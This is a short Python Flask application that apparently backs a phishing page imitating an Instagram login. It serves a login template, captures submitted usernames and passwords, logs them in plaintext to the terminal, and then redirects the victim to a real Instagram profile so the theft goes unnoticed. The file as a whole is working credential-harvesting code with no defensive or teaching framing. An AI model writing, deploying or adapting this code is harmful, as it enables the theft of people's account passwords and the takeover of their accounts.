from flask import Flask, render_template, request, redirect
import os
import logging
import sys

# Flask will look for HTML templates in the same folder
app = Flask(__name__, template_folder=os.path.abspath(os.path.dirname(__file__)))

# Configure logging to print to stdout
logger = logging.getLogger('login_logger')
logger.setLevel(logging.INFO)
handler = logging.StreamHandler(sys.stdout)
formatter = logging.Formatter('%(asctime)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # Log credentials to terminal
    logger.info(f"Login attempt - Username: {username}, Password: {password}")
    
    # Redirect to Instagram page
    return redirect("https://www.instagram.com/ex.clothi/")

if __name__ == '__main__':
    # Run on port 10000
    app.run(host='0.0.0.0', port=10000)
 




